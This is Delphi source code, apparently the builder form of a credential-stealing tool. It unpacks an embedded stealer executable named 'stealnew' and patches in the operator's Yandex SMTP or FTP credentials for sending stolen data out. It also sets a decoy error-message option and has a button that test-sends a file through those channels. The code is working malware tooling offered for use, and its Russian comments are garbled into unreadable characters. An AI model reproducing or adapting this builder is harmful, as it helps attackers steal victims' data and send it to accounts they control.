unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, acSlider, Vcl.StdCtrls, sRadioButton,
  sLabel, Vcl.ExtCtrls, sPanel, sEdit, Vcl.Buttons, sSpeedButton, sGroupBox,
  sDialogs, acPNG, acImage, IdBaseComponent, IdComponent, IdTCPConnection,
  IdTCPClient, IdExplicitTLSClientServerBase, IdMessageClient, IdSMTPBase,
  IdSMTP, IdIOHandler, IdIOHandlerSocket, IdIOHandlerStack, IdSSL, IdSSLOpenSSL,
  IdMessage, IdAttachmentFile, IdHTTP, IdFTP, IdMultiPartFormData, Vcl.ComCtrls,
  sStatusBar;

type
  TForm1 = class(TForm)
    sSaveDialog6: TsSaveDialog;
    sPanel1: TsPanel;
    sGroupBox23: TsGroupBox;
    sEdit23: TsEdit;
    sSlider3: TsSlider;
    sRadioButton5: TsRadioButton;
    sRadioButton6: TsRadioButton;
    sRadioButton7: TsRadioButton;
    sRadioButton8: TsRadioButton;
    sGroupBox27: TsGroupBox;
    sSpeedButton17: TsSpeedButton;
    sStatusBar1: TsStatusBar;
    sSpeedButton22: TsSpeedButton;
    sEdit38: TsEdit;
    sSpeedButton18: TsSpeedButton;
    sEdit37: TsEdit;
    sEdit35: TsEdit;
    sLabel44: TsLabel;
    sRadioButton13: TsRadioButton;
    sRadioButton15: TsRadioButton;
    sLabel46: TsLabel;
    procedure sSpeedButton17Click(Sender: TObject);
    procedure sRadioButton13Click(Sender: TObject);
    procedure sRadioButton15Click(Sender: TObject);
    procedure sSpeedButton18Click(Sender: TObject);
    procedure sSpeedButton22Click(Sender: TObject);
    procedure sSlider3Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

uses Unit2;
{$R stealnew.RES}
{$R libeay32.RES}
{$R ssleay32.RES}
{$R openssl.RES}

type
  TStringArray = array of string;

function GetAddrFromStringInFile(PathFile, FindStr: string): TStringArray;
var
  b: byte;
  fname: string;
  i, j, g: Integer;
  fs: TFileStream;
  tmpaddr: string;
  Count: Integer;

  function bintoAscii(const bin: array of byte): AnsiString;
  var
    i: integer;
  begin
    SetLength(Result, Length(bin));
    for i := 0 to Length(bin) - 1 do
      Result[1 + i] := AnsiChar(bin[i]);
  end;

begin
  Count := 0;
  fname := PathFile;
  fs := TFileStream.Create(FName, fmOpenRead);
  for i := 0 to fs.Size do
  begin
    fs.Seek(i, soFromBeginning);
    fs.Read(b, 1);
    if bintoAscii(b) = FindStr[1] then
    begin
      tmpaddr := IntToHex(i, 8);
      g := i;
      for j := 2 to Length(FindStr) do
      begin
        Inc(g);
        fs.Seek(g, soFromBeginning);
        fs.Read(b, 1);
        if bintoAscii(b) = FindStr[j] then
        begin
          Continue;
        end
        else
        begin
          tmpaddr := '';
          Break;
        end;
        Application.ProcessMessages;
      end;
      if tmpaddr <> '' then
      begin
        SetLength(result, Count + 1);
        Result[Count] := '$' + tmpaddr;
        Inc(Count);
        tmpaddr := '';
      end;
    end;
    Application.ProcessMessages;
  end;
  fs.free;
end;

procedure ExtractRes(ResType, ResName, ResNewName: string);
var
  Res: TResourceStream;
begin
  Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
  Res.SavetoFile(ResNewName);
  Res.Free;
end;


procedure TForm1.sRadioButton13Click(Sender: TObject);
begin
sEdit35.Text:='';
sEdit37.Text:='';
sEdit38.Text:='';
sEdit35.TextHint:='Email';
sEdit37.TextHint:='Password';
sEdit37.PasswordChar:=Char('*');
sEdit38.TextHint:='Email';
sEdit38.PasswordChar:=Char(#0);
//sGroupBox27.Caption := 'smtp.yandex.ru:465';
sSpeedButton18.Caption := 'SEND YANDEX';
Application.ProcessMessages;
Sleep(100);
end;

procedure TForm1.sRadioButton15Click(Sender: TObject);
begin
sEdit35.Text:='';
sEdit37.Text:='';
sEdit38.Text:='';
sEdit35.TextHint:='ftp.server.ru';
sEdit37.TextHint:='Login';
sEdit37.PasswordChar:=Char(#0);
sEdit38.TextHint:='Password';
sEdit38.PasswordChar:=Char('*');
sEdit35.Enabled := True;
sEdit37.Enabled := True;
//sGroupBox27.Caption := 'ftp.server.ru:21';
sSpeedButton18.Caption := 'SEND FTP';
Application.ProcessMessages;
Sleep(100);
end;

procedure TForm1.sSlider3Click(Sender: TObject);
begin
  if sSlider3.SliderOn = True then
  begin
    sRadioButton5.Enabled := False;
    sRadioButton6.Enabled := False;
    sRadioButton7.Enabled := False;
    sRadioButton8.Enabled := False;
    sEdit23.Enabled := False;

  end
  else
  begin
    sRadioButton5.Enabled := True;
    sRadioButton6.Enabled := True;
    sRadioButton7.Enabled := True;
    sRadioButton8.Enabled := True;
    sEdit23.Enabled := True;
  end;
end;

procedure TForm1.sSpeedButton17Click(Sender: TObject);
var
  H, B: Cardinal;
  C: array[0..60] of char;
  Memo: TStringList;
  sn4, sn5, sn6, sn7, sn8, sn9,sn11: AnsiString;
  arr: TStringArray;
begin


  if MessageDlg('Are you sure you want to build a build?', mtConfirmation, [mbYes, mbNo], 0, mbYes) = mrYes then
  begin

    if sSaveDialog6.Execute then
    begin
      ExtractRes('EXEFILE', 'stealnew', sSaveDialog6.FileName + '.exe');
    end;


    sn4 := AnsiString(sEdit35.text);
    sn5 := AnsiString(sEdit37.text);
    sn6 := AnsiString(sEdit38.text);


    if sRadioButton13.Checked = True then
    begin
       sn11 := AnsiString('y');
    end;


    if sRadioButton15.Checked = True then
    begin
       sn11 := AnsiString('f');
    end;



    if sSlider3.SliderOn = True then
    begin
      sn7 := AnsiString('y');
    end
    else
    begin
      sn7 := AnsiString('n');
    end;

    if sRadioButton5.Checked = True then
    begin
      sn8 := AnsiString('warning');
    end;

    if sRadioButton6.Checked = True then
    begin
      sn8 := AnsiString('error');
    end;

    if sRadioButton7.Checked = True then
    begin
      sn8 := AnsiString('confirmation');
    end;

    if sRadioButton8.Checked = True then
    begin
      sn8 := AnsiString('information');
    end;

    if sEdit23.Text <> '' then
    begin
      sn9 := AnsiString(sEdit23.Text);
    end
    else
    begin
      sn9 := AnsiString('information');
    end;

    arr := GetAddrFromStringInFile(sSaveDialog6.FileName + '.exe', '999999999999999999999999999999999999999999999999999999999999');


    H := CreateFile(PChar(sSaveDialog6.FileName + '.exe'), GENERIC_WRITE, FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); //��� �� ����� ������ ����� ����������� ��� ������ � ����� ������ �� dlgSave1



    SetFilePointer(H, StrToInt(arr[0]), nil, FILE_BEGIN); //� winhex ������� ������ ���� ������ ������ ��� ����� ��������
    FillChar(C, 60, 0); //���������� ��� 60 �������� ����� �������� � ����� ������ ��� 50 ��������
    lstrcat(C, PChar(AnsiString(sn4))); //� ������� ���� �� ����� ������� ��������� � ���� ������ ����
    WriteFile(H, C, 60, B, nil); //����������


    SetFilePointer(H, StrToInt(arr[1]), nil, FILE_BEGIN); //� winhex ������� ������ ���� ������ ������ ��� ����� ��������
    FillChar(C, 60, 0); //���������� ��� 60 �������� ����� �������� � ����� ������ ��� 50 ��������
    lstrcat(C, PChar(AnsiString(sn5))); //� ������� ���� �� ����� ������� ��������� � ���� ������ ����
    WriteFile(H, C, 60, B, nil); //����������


    SetFilePointer(H, StrToInt(arr[2]), nil, FILE_BEGIN); //� winhex ������� ������ ���� ������ ������ ��� ����� ��������
    FillChar(C, 60, 0); //���������� ��� 60 �������� ����� �������� � ����� ������ ��� 50 ��������
    lstrcat(C, PChar(AnsiString(sn6))); //� ������� ���� �� ����� ������� ��������� � ���� ������ ����
    WriteFile(H, C, 60, B, nil); //����������

    SetFilePointer(H, StrToInt(arr[3]), nil, FILE_BEGIN); //� winhex ������� ������ ���� ������ ������ ��� ����� ��������
    FillChar(C, 60, 0); //���������� ��� 60 �������� ����� �������� � ����� ������ ��� 50 ��������
    lstrcat(C, PChar(AnsiString(sn7))); //� ������� ���� �� ����� ������� ��������� � ���� ������ ����
    WriteFile(H, C, 60, B, nil); //����������


    SetFilePointer(H, StrToInt(arr[4]), nil, FILE_BEGIN); //� winhex ������� ������ ���� ������ ������ ��� ����� ��������
    FillChar(C, 60, 0); //���������� ��� 60 �������� ����� �������� � ����� ������ ��� 50 ��������
    lstrcat(C, PChar(AnsiString(sn8))); //� ������� ���� �� ����� ������� ��������� � ���� ������ ����
    WriteFile(H, C, 60, B, nil); //����������


    SetFilePointer(H, StrToInt(arr[5]), nil, FILE_BEGIN); //� winhex ������� ������ ���� ������ ������ ��� ����� ��������
    FillChar(C, 60, 0); //���������� ��� 60 �������� ����� �������� � ����� ������ ��� 50 ��������
    lstrcat(C, PChar(AnsiString(sn9))); //� ������� ���� �� ����� ������� ��������� � ���� ������ ����
    WriteFile(H, C, 60, B, nil); //����������

    SetFilePointer(H, StrToInt(arr[6]), nil, FILE_BEGIN); //� winhex ������� ������ ���� ������ ������ ��� ����� ��������
    FillChar(C, 60, 0); //���������� ��� 60 �������� ����� �������� � ����� ������ ��� 50 ��������
    lstrcat(C, PChar(AnsiString(sn11))); //� ������� ���� �� ����� ������� ��������� � ���� ������ ����
    WriteFile(H, C, 60, B, nil); //����������

    CloseHandle(H); //�������

    Application.ProcessMessages;
    Sleep(2000);
    Application.ProcessMessages;


    MessageDlg('+ Done!.', mtInformation, [mbYes], 0);

  end;
end;

procedure TForm1.sSpeedButton18Click(Sender: TObject);
var
  SMTP: TIdSMTP;
  idFTP: TidFTP;
  msg: TIdMessage;
  SSLOpen: TIdSSLIOHandlerSocketOpenSSL;
  idhttp: TIdHTTP;
  formData: TIdMultiPartFormDataStream;
  response: string;
  i:integer;
begin


  if FileExists(ExtractFilePath(Application.ExeName) + 'libeay32.dll') = False then
  begin
    ExtractRes('DllFILE', 'libeay32', ExtractFilePath(Application.ExeName) + 'libeay32.dll');
  end;

  if FileExists(ExtractFilePath(Application.ExeName) + 'ssleay32.dll') = False then
  begin
    ExtractRes('DllFILE', 'ssleay32', ExtractFilePath(Application.ExeName) + 'ssleay32.dll');
  end;

  if FileExists(ExtractFilePath(Application.ExeName) + 'openssl.exe') = False then
  begin
    ExtractRes('EXEFILE', 'openssl', ExtractFilePath(Application.ExeName) + 'openssl.exe');
  end;


  if ((sRadioButton13.Checked = True) and (sEdit35.Text <> '') and (sEdit37.Text <> '')and (sEdit38.Text <> '')) then
    begin
          SMTP := TIdSMTP.Create(Application);
          SMTP.Host := 'smtp.yandex.ru';
          SMTP.Port := 465;

          SMTP.AuthType := satDefault;
          SMTP.Username := sEdit35.Text; {������ ��������� � msg.From.Address}
          SMTP.Password := sEdit37.Text;

        //��� ���������� ������������ ��� SSL
          SSLOpen := TIdSSLIOHandlerSocketOpenSSL.Create(nil);
          SSLOpen.Destination := SMTP.Host + ':' + IntToStr(SMTP.Port);
          SSLOpen.Host := SMTP.Host;
          SSLOpen.Port := SMTP.Port;
          SSLOpen.DefaultPort := 0;
          SSLOpen.SSLOptions.Method := sslvSSLv23;
          SSLOpen.SSLOptions.Mode := sslmUnassigned;

          SMTP.IOHandler := SSLOpen;
          SMTP.UseTLS := utUseImplicitTLS;

          msg := TIdMessage.Create(Application);
          msg.CharSet := 'Windows-1251';
          msg.Body.Text := 'Test Message';
          msg.Subject := 'Test Subject';
          msg.From.Address := sEdit35.Text; {&lt;&lt;������ ��������� � SMTP.UserName}
          msg.From.Name := 'NoName'; //��� �� �������� ����� ���������� ������
          msg.Recipients.EMailAddresses := sEdit38.Text; //����� ���� ���������� ������
          msg.IsEncoded:=True;
          TIdAttachmentFile.Create(msg.MessageParts, 'openssl.exe');
          SMTP.Connect;
          if SMTP.Connected then
          begin
            SMTP.Send(msg);
            ShowMessage('��������� ����������');
          end
          else
            ShowMessage('�� ������� ��������� ���������');
          SMTP.Disconnect();
          SMTP.Free;
          msg.Free;

    end;


    if ((sRadioButton15.Checked = True) and (sEdit35.Text <> '') and (sEdit37.Text <> '') and (sEdit38.Text <> '')) then
    begin

      idFTP := TidFTP.Create();
      idFTP.host := sEdit35.Text; // ���������� ����
      idFTP.username := sEdit37.Text; //��� ������������
      idFTP.password := sEdit38.Text; ///������
      idFTP.Port := 21; ///����

      idFTP.Connect; //������������


      if idFTP.Connected then // ���� ���������� �����
      begin
      ShowMessage('�������������� � �������: '+idFTP.Host); //
      idFTP.Put('openssl.exe', 'openssl.exe', true); /// ���������� ���� �� ������
      ShowMessage('���� openssl.exe �������� �� ������: '+idFTP.Host);
      end;

      if Assigned(idFtp) then
      begin
      idFtp.Disconnect;
      idFtp.Free;
      end;
    end;


end;

procedure TForm1.sSpeedButton22Click(Sender: TObject);
begin
Form2.ShowModal;
end;

end.
